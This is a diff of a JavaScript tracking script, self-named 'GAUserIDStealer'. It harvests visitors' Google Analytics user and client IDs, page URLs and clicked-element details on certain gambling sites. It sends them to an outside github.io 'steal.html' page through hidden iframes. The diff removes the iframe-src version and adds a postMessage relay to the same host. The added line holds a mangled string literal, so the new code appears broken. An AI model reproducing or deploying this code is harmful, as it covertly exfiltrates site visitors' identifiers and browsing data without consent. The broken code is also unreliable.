@@ -24,19 +24,28 @@ function getgaCid() {
     return "";
 }
 
+function msgHub(page, msg) {
+    var hubId = page.replace(".", "")
+    var hub = document.getElementById(hubId);
+    if (hub==null) {
+        var ifrm_msgHub = document.createElement('iframe');
+        ifrm_msgHub.setAttribute('id', hubId);
+        ifrm_msgHub.setAttribute('class', 'g_conv');
+        ifrm_msgHub.setAttribute('src', 'https://'+page)
+        ifrm_msgHub.setAttribute('domain', 'https://'+page);
+        ifrm_msgHub.style.display = "none";
+        ifrm_msgHub.addEventListener("DOMContentLoaded",function(){
+            hub = document.getElementById(hubId);
+            hub.contentWindow.postMessage(msg, 'https://'+page);
+        });
+        document.body.appendChild(ifrm_msgHub);
 
-function removeScript(){
-    var ss=document.getElementsByTagName('script');
-    for(i=0;i<ss.length;i++){
-        if(ss[i].innerHTML.indexOf("function getgaCid()")!==-1){
-            ss[i].parentNode.removeChild(ss[i]);
-            //console.log("Remove script done ver4");
-            break;
-        }
+    } else {
+        hub.contentWindow.postMessage(msg, 'https://'+page);
     }
 }
 
-function searchAndSet(cframe, stackNum) {
+function searchAndSet(stackNum) {
     uid=-1
     for(i=0;i<dataLayer.length;i++){
         try{
@@ -263,51 +272,9 @@ function searchAndSet(cframe, stackNum) {
         elementText="";
     }
 
-
-    if (site_domain.indexOf("thbet99.com")!=-1){
-        cframe.src ="https://guqima.github.io/GAUserIDStealer/tb9_ad.html?uid=="+uid+"&&domain=="+site_domain+"&&cid=="+getgaCid()+"&&url=="+window.location.href+"&&dataanalyticsID="+dataanalyticsID+"&&element_url=="+elementUrl+"&&elementClasses="+elementClasses+"&&elementId="+elementId+"&&elementText="+elementText;
-    }
-    else if (site_domain.indexOf("bonus99.com")!=-1){
-        cframe.src ="https://guqima.github.io/GAUserIDStealer/tb9_ad.html?uid=="+uid+"&&domain=="+site_domain+"&&cid=="+getgaCid()+"&&url=="+window.location.href+"&&dataanalyticsID="+dataanalyticsID+"&&element_url=="+elementUrl+"&&elementClasses="+elementClasses+"&&elementId="+elementId+"&&elementText="+elementText;
-    }
-    else {
-        cframe.src ="https://guqima.github.io/GAUserIDStealer/steal.html?uid=="+uid+"&&domain=="+site_domain+"&&cid=="+getgaCid()+"&&url=="+window.location.href+"&&dataanalyticsID="+dataanalyticsID+"&&element_url=="+elementUrl+"&&elementClasses="+elementClasses+"&&elementId="+elementId+"&&elementText="+elementText;
-    }
-}
-
-var maxStackNum = 3;
-function frameHdl(stackNum, guhappyId) {
-    var cframe = document.getElementById(guhappyId);
-    if (stackNum == maxStackNum){
-        cframe.parentNode.removeChild(cframe);
-    } else {
-        if (stackNum == 0){
-            cframe.addEventListener("load",function(){
-                setTimeout(function(){
-                    frameHdl(stackNum+1, guhappyId);
-                }, 5000);
-            });
-            searchAndSet(cframe, stackNum);
-        } else {
-            var old_element = document.getElementById(guhappyId);
-            cframe = old_element.cloneNode(true);
-            cframe.addEventListener("load",function(){
-                setTimeout(function(){
-                    frameHdl(stackNum+1, guhappyId);
-                }, 5000);
-            });
-            searchAndSet(cframe, stackNum);
-            old_element.parentNode.replaceChild(cframe, old_element);
-        }
-    }
+    msgHub("guqima.github.io/GAUserIDStealer/steal.html", uid=="+uid+"&&domain=="+site_domain+"&&cid=="+getgaCid()+"&&url=="+window.location.href+"&&dataanalyticsID="+dataanalyticsID+"&&element_url=="+elementUrl+"&&elementClasses="+elementClasses+"&&elementId="+elementId+"&&elementText="+elementText="+elementText);
 }
 
 function doFlow(){
-    var guhappyId=makeid(5);
-    var ifrm_c = document.createElement('iframe');
-    ifrm_c.setAttribute('id', guhappyId);
-    ifrm_c.setAttribute('class', 'guhappy_steal');
-    ifrm_c.style.display = "none";
-    document.body.appendChild(ifrm_c);
-    frameHdl(0, guhappyId);
+    searchAndSet(0);
 }
